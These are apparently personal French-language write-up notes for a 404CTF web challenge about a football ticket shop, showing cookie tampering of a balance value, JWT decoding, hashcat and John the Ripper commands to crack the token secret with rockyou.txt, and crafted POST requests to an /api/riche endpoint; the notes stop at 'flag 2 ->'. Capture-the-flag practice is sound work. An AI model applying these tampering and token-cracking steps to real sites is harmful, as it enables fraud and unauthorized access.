1/2

s'inscrire sur le site

des cookies apparaissent une fois connecte

modifier le cookie balance a 40 et prendre un ticket a 40

visiter la section des billets -> telecharger le billet === flag

flag.png

---------

2/2

coup d'oeil sur le code js

/achat -> argument "numero"

recherche de .post(" dans le code

tentative de "numero" = "VIP"

vu dans le code d'un message en cas de detection d'un hacker response=3

analyse du JWT

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlQzc3RhYnRlc3QiLCJiaWxsZXRzIjp7IlZJUCI6MCwiTGF0ZXJhbGUiOjQsIkZhbWlsaWFsZSI6MCwiRXN0IjowLCJPdWVzdCI6MCwiTm9yZCBldCBTdWQiOjAsInVuZGVmaW5lZCI6bnVsbCwiVHJpYnVuZSBWSVAiOm51bGx9LCJpYXQiOjE3MTM2NTU0ODl9._gN0ig9u4PgIC1dxwBceuJqG1XQz5ToPe2qCpdmvRmw
```

payload

```
{
  "username": "T3stabtest",
  "billets": {
    "VIP": 0,
    "Laterale": 4,
    "Familiale": 0,
    "Est": 0,
    "Ouest": 0,
    "Nord et Sud": 0,
    "undefined": null,
    "Tribune VIP": null
  },
  "iat": 1713655489
}
```

Tentative de forger un JWT

header

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

install de kali pour avoir hashcat et wordlists

on place le JWT dans jwt_token.txt

https://jwt.io/

mm si c'est du RS256, on tests juste in case

https://security.stackexchange.com/a/262875

```
hashcat -m 16500 -a 0 jwt_token.txt /usr/share/wordlists/rockyou.txt
```
output
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================       
* Device #1: cpu-haswell-Intel(R) Core(TM) i9-14900K, 10902/21869 MB (4096 MB allocatable), 32MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile 'jwt_token.txt' on line 1 (eyJhbG...hFXVmCTzS8h2i2EYjwFufTkgMBdpfkJw): Token length exception

* Token length exception: 1/1 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

No hashes loaded.

Started: Sun Apr 21 02:05:15 2024
Stopped: Sun Apr 21 02:05:15 2024

```

Ca a pas l'air d'etre ca

on s'obstine avec john the ripper

```
john jwt_token.txt -w=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```
output
```
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2024-04-21 02:05) 0g/s 5878Kp/s 5878Kc/s 5878KC/s -xlengx-..*7¡Vamos!
Session completed.
```

Peut etre du masse assignement

OPTIONS -> tout est ouvert mais a par POST, rien ne repond

400 sur un POST avec un "numero" = "VIP"
```
{
  "message": "Hacker Détecté"
}
```

On revient sur le js
/billets avec arg "token" donne la liste -> semble decoder le token

une autre page reste intrigante -> /riche -> qui semble produire le second flag `(t, "flag.png")`

Faut bien forger le JWT ??

Sans forger le JWT on tombe sur le flag precedent
```
POST https://le-match-du-siecle.challenges.404ctf.fr/api/riche
Content-Type: application/json
Accept: application/json
Cookie: balance=1000;session=c40d13a6-0d95-47ec-8e76-4908c60bb759.t2VbC6BDSBywggHUqOIIIc4eA3Q;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlQzc3RhYnRlc3QiLCJiaWxsZXRzIjp7IlZJUCI6MCwiTGF0ZXJhbGUiOjQsIkZhbWlsaWFsZSI6MCwiRXN0IjowLCJPdWVzdCI6MCwiTm9yZCBldCBTdWQiOjAsInVuZGVmaW5lZCI6bnVsbCwiVHJpYnVuZSBWSVAiOm51bGx9LCJpYXQiOjE3MTM2NTcwODl9.W-wuSBe5T3v_2t5_Ycauqq3NI5TcTj_lfGue4RyCMMMAleqTxCSXVKYs07A9VxXjhef_SwX15Gw8fED5T9fAN5rFD6Lv8dvwcQGVM_Bq2hwx08Je_FAVtezlHjIT19VC7MXG3ljdUGGdGMOrYcnknKd-leutXMErcdQzS3qUMUjm8LBXYD75FQBOrs8FyfcHxIPXc6hyf5DOTuPzGs7IPgDVARYAfZgejO6YEXeLWM63R17I26I1TGvEKycdKGxfrT28I2sqMlucGkeVqFtNre_rjVHUwQx5bD9tSGESvW2M3iDrTUzk2YhFXVmCTzS8h2i2EYjwFufTkgMBdpfkJw

{
  "token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlQzc3RhYnRlc3QiLCJiaWxsZXRzIjp7IlZJUCI6MCwiTGF0ZXJhbGUiOjQsIkZhbWlsaWFsZSI6MCwiRXN0IjowLCJPdWVzdCI6MCwiTm9yZCBldCBTdWQiOjAsInVuZGVmaW5lZCI6bnVsbCwiVHJpYnVuZSBWSVAiOm51bGx9LCJpYXQiOjE3MTM2NTcwODl9.W-wuSBe5T3v_2t5_Ycauqq3NI5TcTj_lfGue4RyCMMMAleqTxCSXVKYs07A9VxXjhef_SwX15Gw8fED5T9fAN5rFD6Lv8dvwcQGVM_Bq2hwx08Je_FAVtezlHjIT19VC7MXG3ljdUGGdGMOrYcnknKd-leutXMErcdQzS3qUMUjm8LBXYD75FQBOrs8FyfcHxIPXc6hyf5DOTuPzGs7IPgDVARYAfZgejO6YEXeLWM63R17I26I1TGvEKycdKGxfrT28I2sqMlucGkeVqFtNre_rjVHUwQx5bD9tSGESvW2M3iDrTUzk2YhFXVmCTzS8h2i2EYjwFufTkgMBdpfkJw"
}
```

sur /riche, le token n'est pas le JWT mais le tipe de billet

```
POST https://le-match-du-siecle.challenges.404ctf.fr/api/riche
Content-Type: application/json
Accept: application/json
Cookie: balance=1000;session=c40d13a6-0d95-47ec-8e76-4908c60bb759.t2VbC6BDSBywggHUqOIIIc4eA3Q;token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlQzc3RhYnRlc3QiLCJiaWxsZXRzIjp7IlZJUCI6MCwiTGF0ZXJhbGUiOjQsIkZhbWlsaWFsZSI6MCwiRXN0IjowLCJPdWVzdCI6MCwiTm9yZCBldCBTdWQiOjAsInVuZGVmaW5lZCI6bnVsbCwiVHJpYnVuZSBWSVAiOm51bGx9LCJpYXQiOjE3MTM2NTcwODl9.W-wuSBe5T3v_2t5_Ycauqq3NI5TcTj_lfGue4RyCMMMAleqTxCSXVKYs07A9VxXjhef_SwX15Gw8fED5T9fAN5rFD6Lv8dvwcQGVM_Bq2hwx08Je_FAVtezlHjIT19VC7MXG3ljdUGGdGMOrYcnknKd-leutXMErcdQzS3qUMUjm8LBXYD75FQBOrs8FyfcHxIPXc6hyf5DOTuPzGs7IPgDVARYAfZgejO6YEXeLWM63R17I26I1TGvEKycdKGxfrT28I2sqMlucGkeVqFtNre_rjVHUwQx5bD9tSGESvW2M3iDrTUzk2YhFXVmCTzS8h2i2EYjwFufTkgMBdpfkJw

{
  "token": "VIP"
}
```

flag 2 -> 

